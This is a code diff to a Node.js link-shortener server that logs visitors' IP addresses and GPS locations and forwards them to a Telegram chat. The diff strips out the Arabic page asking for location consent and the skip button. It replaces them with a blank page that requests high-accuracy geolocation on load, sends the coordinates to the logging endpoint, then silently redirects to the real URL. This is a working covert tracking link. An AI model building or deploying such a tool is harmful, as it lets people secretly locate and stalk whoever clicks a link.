@@ -88,7 +88,6 @@ app.post('/api/log-gps', async (req, res) => {
   }
 
   const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown').split(',')[0].trim();
-  const userAgent = req.get('user-agent') || 'Unknown';
   linkStorage[code].clicks++;
 
   let address = null;
@@ -111,20 +110,9 @@ app.post('/api/log-gps', async (req, res) => {
     if (address) {
       msg += `\n<b>📮 العنوان:</b>\n${address}\n`;
     }
-    
-    msg += `━━━━━━━━━━━━━━━━━━━\n\n`;
   } else {
-    msg += `<b>❌ بدون GPS</b>\n`;
-    msg += `المستخدم رفض السماح بالموقع\n`;
-    msg += `━━━━━━━━━━━━━━━━━━━\n\n`;
+    msg += `<b>❌ بدون GPS</b>\nالمستخدم رفض السماح بالموقع`;
   }
-
-  msg += `<b>🖥️ Device:</b>\n`;
-  if (/android/i.test(userAgent)) msg += `📱 Android`;
-  else if (/iphone|ipad/i.test(userAgent)) msg += `📱 iOS`;
-  else if (/windows/i.test(userAgent)) msg += `💻 Windows`;
-  else if (/mac os/i.test(userAgent)) msg += `🍎 macOS`;
-  else msg += `🖥️ Other`;
 
   await sendToTelegram(msg);
   res.json({ success: true });
@@ -141,196 +129,57 @@ app.get('/:code', (req, res) => {
   const { code } = req.params;
 
   if (!linkStorage[code]) {
-    return res.status(404).send('<h1 style="text-align:center;margin-top:50px">الرابط غير موجود</h1>');
+    return res.status(404).send('<h1>Not found</h1>');
   }
 
   const originalUrl = linkStorage[code].original;
 
   res.send(`<!DOCTYPE html>
-<html dir="rtl" lang="ar">
+<html>
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>جاري التحميل...</title>
   <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
-    body {
-      background: #000;
-      color: #fff;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      min-height: 100vh;
-      flex-direction: column;
-      gap: 30px;
-    }
-    .container {
-      text-align: center;
-      max-width: 500px;
-      padding: 40px;
-    }
-    h1 {
-      font-size: 32px;
-      margin-bottom: 20px;
-      color: #4CAF50;
-    }
-    .message {
-      font-size: 18px;
-      margin-bottom: 30px;
-      line-height: 1.6;
-      color: #ddd;
-    }
-    button {
-      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-      color: white;
-      border: none;
-      padding: 18px 50px;
-      font-size: 18px;
-      border-radius: 10px;
-      cursor: pointer;
-      font-weight: bold;
-      transition: transform 0.2s;
-    }
-    button:hover {
-      transform: scale(1.05);
-    }
-    button:active {
-      transform: scale(0.95);
-    }
-    .loading {
-      display: none;
-      font-size: 16px;
-      color: #667eea;
-      margin-top: 20px;
-    }
-    .spinner {
-      display: inline-block;
-      width: 20px;
-      height: 20px;
-      border: 3px solid #333;
-      border-top: 3px solid #667eea;
-      border-radius: 50%;
-      animation: spin 1s linear infinite;
-      margin-right: 10px;
-    }
-    @keyframes spin {
-      to { transform: rotate(360deg); }
-    }
-    .error {
-      display: none;
-      color: #f44336;
-      font-size: 16px;
-      margin-top: 20px;
-    }
-    .skip {
-      display: none;
-      color: #999;
-      font-size: 14px;
-      margin-top: 20px;
-      text-decoration: underline;
-      cursor: pointer;
-    }
-    .skip:hover {
-      color: #ccc;
-    }
+    body { margin: 0; padding: 0; background: #000; }
   </style>
 </head>
 <body>
-  <div class="container">
-    <h1>🎯 طلب موقعك</h1>
-    <div class="message">
-      نحتاج موقعك الدقيق لكي نتمكن من متابعتك بشكل أفضل.
-      <br><br>
-      اضغط الزر أدناه وسمح بالوصول لموقعك.
-    </div>
-    
-    <button id="gpsBtn" onclick="requestGPS()">🎯 اطلب موقعي الآن</button>
-    
-    <div class="loading" id="loading">
-      <div class="spinner"></div>
-      جاري الحصول على الموقع...
-    </div>
-    
-    <div class="error" id="error"></div>
-    
-    <div class="skip" id="skip" onclick="skipGPS()">تخطي ➜</div>
-  </div>
-
   <script>
     const code = ${JSON.stringify(code)};
     const originalUrl = ${JSON.stringify(originalUrl)};
     const apiUrl = '${BASE_URL}/api/log-gps';
 
-    function showLoading() {
-      document.getElementById('gpsBtn').style.display = 'none';
-      document.getElementById('loading').style.display = 'block';
-      document.getElementById('skip').style.display = 'block';
+    function go() {
+      window.location.href = originalUrl;
     }
 
-    function showError(msg) {
-      document.getElementById('error').textContent = msg;
-      document.getElementById('error').style.display = 'block';
-      document.getElementById('loading').style.display = 'none';
-      document.getElementById('skip').style.display = 'block';
-    }
-
-    function requestGPS() {
-      showLoading();
-
-      if (!navigator.geolocation) {
-        showError('المتصفح لا يدعم GPS');
-        return;
-      }
-
+    if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(
-        (position) => {
-          const lat = position.coords.latitude;
-          const lng = position.coords.longitude;
-          const accuracy = position.coords.accuracy;
-
+        (pos) => {
           fetch(apiUrl, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
               code: code,
-              latitude: lat,
-              longitude: lng,
-              accuracy: accuracy
+              latitude: pos.coords.latitude,
+              longitude: pos.coords.longitude,
+              accuracy: pos.coords.accuracy
             }),
             keepalive: true
-          }).catch(() => {});
-
-          setTimeout(() => {
-            window.location.href = originalUrl;
-          }, 500);
+          }).finally(go);
         },
-        (error) => {
-          showError('رفضت السماح بالموقع. اضغط تخطي للمتابعة.');
-          document.getElementById('skip').style.display = 'block';
+        () => {
+          fetch(apiUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ code: code, latitude: null, longitude: null, accuracy: null }),
+            keepalive: true
+          }).finally(go);
         },
-        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+        { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
       );
-    }
-
-    function skipGPS() {
-      fetch(apiUrl, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          code: code,
-          latitude: null,
-          longitude: null,
-          accuracy: null
-        }),
-        keepalive: true
-      }).catch(() => {});
-
-      window.location.href = originalUrl;
+    } else {
+      go();
     }
   </script>
 </body>
